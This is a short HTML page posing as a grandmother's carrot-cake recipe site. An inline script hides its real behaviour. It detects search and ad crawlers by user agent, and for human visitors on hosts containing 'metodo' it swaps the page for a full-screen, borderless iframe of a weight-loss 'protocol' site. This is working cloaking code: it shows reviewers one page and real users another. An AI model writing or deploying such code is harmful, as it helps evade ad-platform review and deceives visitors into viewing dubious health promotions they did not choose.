<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Delícias da Vovó</title>
    <style>
        /* Bloqueia qualquer movimento lateral na página principal */
        body, html { 
            margin: 0 !important; 
            padding: 0 !important; 
            width: 100% !important; 
            height: 100% !important; 
            overflow-x: hidden !important; 
            background-color: #000; /* Ajuda a não ver bordas brancas enquanto carrega */
        }
        /* O segredo para o Iframe não vazar: max-width 100% */
        iframe { 
            position: absolute; 
            top: 0; 
            left: 0; 
            width: 100% !important; 
            min-width: 100% !important;
            max-width: 100% !important;
            height: 100% !important; 
            border: none !important;
        }
        .safe-content { padding: 20px; color: #fff; font-family: sans-serif; }
    </style>
</head>
<body>

<script>
    const currentHost = window.location.hostname;
    const isBot = /bot|googlebot|facebookexternalhit|adsbot-google|applebot/i.test(navigator.userAgent);

    if (currentHost.includes('metodo') && !isBot) {
        document.body.innerHTML = '<iframe src="https://protocoloemagrecimentodivino.lovable.app/" allowfullscreen></iframe>';
    }
</script>

<div class="safe-content">
    <h1>O Melhor Bolo de Cenoura Perfeito</h1>
    <p>Receita tradicional...</p>
</div>

</body>
</html>
